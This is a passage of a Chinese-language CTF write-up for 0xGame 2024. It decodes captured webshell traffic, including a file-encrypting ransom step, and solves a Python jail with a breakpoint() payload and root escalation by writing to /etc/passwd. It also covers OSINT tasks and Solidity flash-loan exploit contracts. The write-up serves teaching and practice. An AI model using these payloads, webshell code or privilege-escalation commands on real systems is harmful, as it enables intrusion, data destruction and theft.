invoke__">base64_encode</span>(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">        <span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;none of proc_open/passthru/shell_exec/exec/exec is available&quot;</span>);</span><br><span class="line">        <span class="variable">$key</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">encrypt</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$result</span>[<span class="string">&quot;status&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    <span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">getSafeStr</span>(<span class="variable">$kWJW</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">encrypt</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Encrypt</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$data</span>[<span class="variable">$i</span>] = <span class="variable">$data</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$bs</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;encode&quot;</span>;</span><br><span class="line">    <span class="variable">$after</span>=<span class="variable">$bs</span>(<span class="variable">$data</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$after</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="string">&quot;Y2QgL2QgIkQ6XEFBQUNURlxXRUJccGhwU3R1ZHlfNjRccGhwc3R1ZHlfcHJvXFdXV1x1cGxvYWRcIiZkaXI=&quot;</span>;<span class="variable">$cmd</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$cmd</span>);<span class="variable">$path</span>=<span class="string">&quot;RDovQUFBQ1RGL1dFQi9waHBTdHVkeV82NC9waHBzdHVkeV9wcm8vV1dXL3VwbG9hZC8=&quot;</span>;<span class="variable">$path</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$path</span>);</span><br><span class="line"><span class="title function_ invoke__">main</span>(<span class="variable">$cmd</span>,<span class="variable">$path</span>);</span><br></pre></td></tr></table></figure><p>可以看到主要的操作是先将<code>$cmd</code>和<code>$path</code>进行<code>base64_decode</code>，之后执行并返回 先<code>json_encode</code>后<code>Encrypt</code>的<code>$result</code>，<code>$result</code>中有两个信息，<code>base64_encode</code>后的<code>status</code>和<code>msg</code>，其中<code>msg</code>是执行系统命令后的回显结果。于是可以先分析出第三段进行的操作：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /d <span class="string">&quot;D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW\upload\&quot;&amp;dir</span></span><br></pre></td></tr></table></figure><p>结合流量的响应包可以分析出上述操作后的结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Decrypt</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>; </span><br><span class="line">    <span class="variable">$bs</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">    <span class="variable">$after</span>=<span class="variable">$bs</span>(<span class="variable">$data</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$after</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$after</span>[<span class="variable">$i</span>] = <span class="variable">$after</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$after</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&quot;TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd9eghDQVwxLhN6M2NDdiAgfXo2B0BcAwQKejN3Rh4DPEZMIV5eSyIJC0QgVVhXASt3XCFfWFsACw9aMFVHWj5KWFwvVV5TUQMPWC8BVXs2PEx6NgMCdDMsVnE1Vnx2CydxeglLcGgzIyZjIWNRY1Izd20tcV1aICtSUTNrB20YPARtLXFdWi4rUlEzawdtUSdNV1RLam9XAQFRPHtBV1AjX3wqVlNRKQAARxFuC1kzVX9xNFxLdCIsUnkeeAd5GCAHfCZyS3QyChp4J3hVfCEkDGcgX2FpDyQFfCd4VXwhJFN8JnJHfTcKG3ggcAJ5GCQBeR92AXAlJBt4MFZFeiEkU3wmcgprIwkxZQ14VXwhJFN8JnJVcCUkF3kDCXl4CCRNeyYLRXY1XRp7HXhVeAggAngxclVwJSQFfCd4VXwhJFN8JnJVcCUkGHggWlVWUA1YVyJER1ohDRVxNVZVfCEkU3wmclVwJSQFfCd4VXwhJEx8KmAGSBMENV1PagVBCyRTfCZyVXAlJAV8J3hVfCYoQ3scd15LPAMNXAtwfHYLJFN8JnJVcCUkBXwneFV8ISRTfCF6VQwqDBMAUUxHAABXYnwhegJ3HxIbex5SQXsIDk55IVRLdyUhDl9SZR1bDi5eWRdpVFYPCit7J14PCEAY&quot;</span>;</span><br><span class="line"><span class="variable">$d</span> = <span class="title function_ invoke__">Decrypt</span>(<span class="variable">$shell</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$d</span>);</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;status&quot;:&quot;c3VjY2Vzcw==&quot;,&quot;msg&quot;:&quot;IOmpseWKqOWZqCBEIOS4reeahOWNt+aYryDmlrDliqDljbcNCiDljbfnmoTluo\/liJflj7fmmK8gNTYxOS00MUI4DQoNCiBEOlxBQUFDVEZcV0VCXHBocFN0dWR5XzY0XHBocHN0dWR5X3Byb1xXV1dcdXBsb2FkIOeahOebruW9lQ0KDQoyMDI0LzA5LzE3ICAyMToxMCAgICA8RElSPiAgICAgICAgICAuDQoyMDI0LzA5LzE3ICAyMTowOCAgICA8RElSPiAgICAgICAgICAuLg0KMjAyNC8wOS8xNyAgMjE6MTAgICAgICAgICAgICAgICAzMDcgc2hlbGwucGhwDQogICAgICAgICAgICAgICAxIOS4quaWh+S7tiAgICAgICAgICAgIDMwNyDlrZfoioINCiAgICAgICAgICAgICAgIDIg5Liq55uu5b2VIDI0NywyNzksNjkzLDgyNCDlj6\/nlKjlrZfoioINCg==&quot;&#125;</span><br></pre></td></tr></table></figure><p>进行base64解码可以得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">status:success</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msg:</span><br><span class="line"> 驱动器 D 中的卷是 新加卷</span><br><span class="line"> 卷的序列号是 5619-41B8</span><br><span class="line"></span><br><span class="line"> D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW\upload 的目录</span><br><span class="line"></span><br><span class="line">2024/09/17  21:10    &lt;DIR&gt;          .</span><br><span class="line">2024/09/17  21:08    &lt;DIR&gt;          ..</span><br><span class="line">2024/09/17  21:10               307 shell.php</span><br><span class="line">               1 个文件            307 字节</span><br><span class="line">               2 个目录 247,279,693,824 可用字节</span><br></pre></td></tr></table></figure><p>之后一段段分析即可，整段攻击过程如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /d <span class="string">&quot;D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW\upload\&quot;&amp;dir</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> 驱动器 D 中的卷是 新加卷</span></span><br><span class="line"><span class="string"> 卷的序列号是 5619-41B8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW\upload 的目录</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2024/09/17  21:10    &lt;DIR&gt;          .</span></span><br><span class="line"><span class="string">2024/09/17  21:08    &lt;DIR&gt;          ..</span></span><br><span class="line"><span class="string">2024/09/17  21:10               307 shell.php</span></span><br><span class="line"><span class="string">               1 个文件            307 字节</span></span><br><span class="line"><span class="string">               2 个目录 247,279,693,824 可用字节</span></span><br><span class="line"><span class="string">               </span></span><br><span class="line"><span class="string">               </span></span><br><span class="line"><span class="string">cd /d &quot;</span>D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW\upload\&quot;&amp;<span class="built_in">cd</span> ../</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /d <span class="string">&quot;D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW\upload\..\&quot;&amp;dir</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> 驱动器 D 中的卷是 新加卷</span></span><br><span class="line"><span class="string"> 卷的序列号是 5619-41B8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW 的目录</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2024/09/17  21:08    &lt;DIR&gt;          .</span></span><br><span class="line"><span class="string">2024/09/07  18:30    &lt;DIR&gt;          ..</span></span><br><span class="line"><span class="string">2024/09/16  23:22               332 index.html</span></span><br><span class="line"><span class="string">2024/09/17  20:21                75 unfinished_hello.php</span></span><br><span class="line"><span class="string">2024/09/17  21:10    &lt;DIR&gt;          upload</span></span><br><span class="line"><span class="string">2024/09/17  11:07             1,202 upload.php</span></span><br><span class="line"><span class="string">               3 个文件          1,609 字节</span></span><br><span class="line"><span class="string">               3 个目录 247,279,693,824 可用字节</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cd /d &quot;</span>D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW\upload\..\&quot;&amp;openssl version</span><br><span class="line"></span><br><span class="line">WARNING: can<span class="string">&#x27;t open config file: /usr/local/ssl/openssl.cnf</span></span><br><span class="line"><span class="string">OpenSSL 1.0.2p  14 Aug 2018</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cd /d &quot;D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW\upload\..\&quot;&amp;openssl enc -aes-128-cbc -in unfinished_hello.php -out secret.php -iv 114514 -K c4d038b4bed09fdb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">WARNING: can&#x27;</span>t open config file: /usr/local/ssl/openssl.cnf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /d <span class="string">&quot;D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW\upload\..\&quot;&amp;del unfinished_hello.php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cd /d &quot;</span>D:\AAACTF\WEB\phpStudy_64\phpstudy_pro\WWW\upload\..\&quot;&amp;<span class="built_in">echo</span> <span class="string">&quot;If you want to decrypt your file, give me a copy of your calculus homework. UwU&quot;</span> &gt; readme.txt</span><br></pre></td></tr></table></figure><p>可以看到是用<code>openssl</code>对<code>unfinished_hello.php</code>进行了文件加密，且删掉了原文件，只需要用<code>openssl</code>解<code>secret.php</code>即可拿到原文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl aes-128-cbc -d -<span class="keyword">in</span> secret.php -out flag.php -iv 114514 -K c4d038b4bed09fdb</span><br></pre></td></tr></table></figure><p>输出的<code>flag.php</code>文件内容为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//0xGame&#123;8552BB81-D51A-FDCE-2EF1-55EBBEFF9B9C&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello, </span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Untouchable-flag"><a href="#Untouchable-flag" class="headerlink" title="Untouchable flag"></a>Untouchable flag</h3><p>题目附件为<code>pyjail.py</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pyjail</span>():</span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">&quot;[a-zA-Z0-9]&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        code = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> re.findall(pattern,code):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Some characters in your code are banned.&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">len</span>(code) &gt; <span class="number">12</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Your code is too long.&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">eval</span>(code)</span><br></pre></td></tr></table></figure><p>可以看到禁用了所有字母和数字，并且对代码长度有所限制，必须不大于12</p><p>nc连上后题目还给了一个hint:<code>the Python version is greater than 3.7.</code>，网上找找可以知道python3支持非ASCII字符，可以用unicode字符绕过第一个限制，并且还可以找到从Python 3.7开始引入了breakpoint()函数，于是可以绕过第二个限制进行rce：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;47.98.178.117&quot;</span>, <span class="number">2222</span>)</span><br><span class="line"></span><br><span class="line">code = <span class="string">&quot;𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()&quot;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>拿到shell后直接读flag发现不行，<code>ls- l</code>查看文件权限可以看到flag文件只有root可读，需要寻找提权的方法</p><p>预期解是&#x2F;etc&#x2F;passwd提权，可以看到环境中该文件所有用户可读可写，直接写入一个拥有root权限的用户即可</p><p>办法有很多，这里拿openssl举例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt <span class="built_in">test</span> z9nn8w</span><br><span class="line"></span><br><span class="line">$1$<span class="built_in">test</span><span class="variable">$eicwC</span>/tivElau/ii72ooo0</span><br></pre></td></tr></table></figure><p>写入&#x2F;etc&#x2F;passwd再切换用户即可拿到root权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;w8nn9z:$1$test$eicwC/tivElau/ii72ooo0:0:0:root:/root:/bin/bash&#x27;</span> &gt;&gt; /etc/passwd</span><br><span class="line"></span><br><span class="line">su w8nn9z</span><br><span class="line">z9nn8w</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> flag</span><br><span class="line">0xGame&#123;PyJ@i1_w1Th_P@sswd_3l3Vat3_pr1v1l3g3&#125;</span><br></pre></td></tr></table></figure><h2 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h2><h3 id="互联网的一角"><a href="#互联网的一角" class="headerlink" title="互联网的一角*"></a>互联网的一角*</h3><p>访问题目页面，摁F12就可以看到前端有注释</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496038143-772e7f75-6c33-4116-b94c-c0d36f545137.png" alt="img"></p><p>这里的注释指的是要求查询CNAME记录，后面上的hint中也给出了。查询CNAME记录的方法其实有很多，ping、nslookup、dig等等都可以，最简单的就是这里直接ping一下。</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496038235-4d8653c5-31da-4d1b-b764-63526956deee.png" alt="img"></p><p>对于.github.io，如果有经验的话一眼就知道这是github pages。如果不知道，查找一下也很快能得知，这是github上一个叫做oxg4me2024的用户搭建的页面，去github上搜索一下这个用户。</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496038235-e0196d4a-c59c-41ed-89c5-415f4634b550.png" alt="img"></p><p>一路顺藤摸瓜找进去，可以找到flag.txt</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496038439-fc672b55-e3f9-4f20-a427-05f89a278b93.png" alt="img"></p><p>但是flag.txt的内容并不是flag，这里点击右上角的History，查询这个文件的修改历史即可看到flag</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496038352-7848d4ed-657a-46b7-8544-ab7f3a4ebc78.png" alt="img"></p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496039022-84e0b736-aacc-4478-909c-cd8575d148cd.png" alt="img"></p><h3 id="给我干哪来了，这还是国内吗？？"><a href="#给我干哪来了，这还是国内吗？？" class="headerlink" title="给我干哪来了，这还是国内吗？？*"></a>给我干哪来了，这还是国内吗？？*</h3><p>图寻题，就是要求找出图片中的地方</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496039163-3beb9aaf-8f2c-4881-8918-7fd3ffcc6d97.png" alt="img"></p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496039211-e2bccf95-0314-4cb1-b842-84e86119462c.png" alt="img"></p><p>其实不难看出来，底下还有个google的logo没能删掉，这个地方其实可以在google map上找到原图。将图片放大，可以看到远处建筑物上标着的super st bernard，在google map上一搜就有。位置差不多在45.90°N，7.19°E左右。</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496039439-56cf623b-ea8f-459a-adbd-6090d85977c9.png" alt="img"></p><p>可以查看实景</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496039766-63e8739d-7f7e-4818-bee6-5277f8aada3c.png" alt="img"></p><p>国家是瑞士不用多说，剩下的可以在<a href="https://zh.wikipedia.org/wiki/%E7%91%9E%E5%A3%AB%E5%9F%8E%E5%B8%82%E5%88%97%E8%A1%A8">维基百科</a>上找到，改成英文即可</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496039879-b9b181ee-f9e0-4f73-90cf-101503a7bfa5.png" alt="img"></p><p>0xGame{Switzerland_Valais_Entremont_Bourg-Saint-Pierre}</p><h2 id="Blockchain"><a href="#Blockchain" class="headerlink" title="Blockchain"></a>Blockchain</h2><h3 id="肘，上链！"><a href="#肘，上链！" class="headerlink" title="肘，上链！*"></a>肘，上链！*</h3><p>出题时用的是github上的<a href="https://github.com/chainflag/solidity-ctf-template/tree/401c6c470acdeada5eb64ba5bc258a85c503f43c">solidctf</a>项目，所以nc那边传完一次就断就不要拷打我了o(╥﹏╥)o</p><p>先nc创建账户</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912624735-18388018-e88f-4cdc-abc2-5a937e74ee03.png" alt="img"></p><p>拿给的账号去水龙头上接一下水</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912625208-5fe4b9dc-a87c-472a-958c-84f7af5c0d25.png" alt="img"></p><p>部署题目合约</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912625378-4cda8e9b-65b0-4bcd-b269-2c7305d4f617.png" alt="img"></p><p>打开metamask（一个浏览器插件），如下图连接到RPC，其中链ID随便填一个它就会告诉你正确的链ID</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912625196-76cd899a-2417-4c10-8b2f-2a5066ee6f09.png" alt="img"></p><p>切换到该网络，拿自己的账户也去水龙头上接一下水</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912625278-21646646-c154-4558-8aff-55a3795288a1.png" alt="img"></p><p>获取一下题目合约</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912625381-4745037b-e25c-4ca7-9fe6-4b0de94d873e.png" alt="img"></p><p>打开<a href="https://remix.ethereum.org/">remix</a>，这里新建一个文件，把题目合约复制过去</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912627380-67d425d2-0b89-41c0-9555-c662c9e0df00.png" alt="img"></p><p>选择相应的版本，编译合约</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912627784-9dbc9b55-908e-4383-bdb0-046067fba524.png" alt="img"></p><p>Environment中选择Injected Provider - MetaMask，注意metamask的小窗口要点开看一下是否连接成功</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912627408-f4fa0a7d-65bc-4daf-8b43-606569e700a4.png" alt="img"></p><p>将前面nc时给的合约地址复制过来到At Address里面，点击At Address</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912627406-e6f814b4-2dc5-410f-9c34-a9b471e119d5.png" alt="img"></p><p>题目的合约代码很简单，要求传的值需要与”Hello0xBlockchain”的keccak256哈希值相同，这里用web3py计算一下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from web3 import Web3</span><br><span class="line">s=b&quot;Hello0xBlockchain&quot;</span><br><span class="line">w3 = Web3()</span><br><span class="line">hash_bytes = w3.keccak(s)</span><br><span class="line">hash_hex = hash_bytes.hex()</span><br><span class="line">print(hash_hex)</span><br></pre></td></tr></table></figure><p>得到的结果复制到sign里面，前面记得加上0x，然后点击sign，中间有个交易的对话框，确认一下</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912627608-ae23158a-a906-4dcb-b3ad-8572b828b37b.png" alt="img"></p><p>点击isSolved，看到值已经返回了true</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912628021-d06a3d0f-311b-44e8-a3a1-b9d22c7e8a4f.png" alt="img"></p><p>回到nc那边，get flag</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912628025-45d879a5-0f85-4af1-ba10-6b13b11577a3.png" alt="img"></p><h3 id="theft"><a href="#theft" class="headerlink" title="theft"></a>theft</h3><p>通过在execute中执行deposit，来替代还款，从而可以达到借了就还但是自己的余额越来越多</p><p>Exp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface FlashLoan &#123;</span><br><span class="line">    function deposit() external payable;</span><br><span class="line">    function withdraw() external;</span><br><span class="line">    function flashLoan(uint256 amount) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Exp &#123;</span><br><span class="line">    FlashLoan public FL;</span><br><span class="line"></span><br><span class="line">    constructor(address _addr) &#123;</span><br><span class="line">        FL = FlashLoan(_addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external &#123;</span><br><span class="line">        for(int i = 0; i &lt; 9; i++)&#123;</span><br><span class="line">            FL.flashLoan(100 ether);</span><br><span class="line">        &#125;</span><br><span class="line">        FL.flashLoan(99 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function execute() external payable &#123;</span><br><span class="line">        FL.deposit&#123;value: msg.value&#125;();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先at address部署Setup.sol获取target地址，然后填入构造函数部署再调用attack即可</p><h3 id="我哪来那么多臭钱？？"><a href="#我哪来那么多臭钱？？" class="headerlink" title="我哪来那么多臭钱？？*"></a>我哪来那么多臭钱？？*</h3><p>具体的部署等操作这里就不再赘述了，详见week1的wp。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.7.0;</span><br><span class="line"></span><br><span class="line">contract Challenge &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balance;</span><br><span class="line">    bool public solve;</span><br><span class="line">    constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function Get() public &#123;</span><br><span class="line">        balance[msg.sender] = 50;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function Transfer(address to, uint256 amount) public &#123;</span><br><span class="line">        require(amount &gt; 0, &quot;Man!&quot;);</span><br><span class="line">        require(balance[msg.sender] &gt; 0, &quot;What can I say&quot;);</span><br><span class="line">        require(balance[msg.sender] - amount &gt; 0, &quot;Mamba 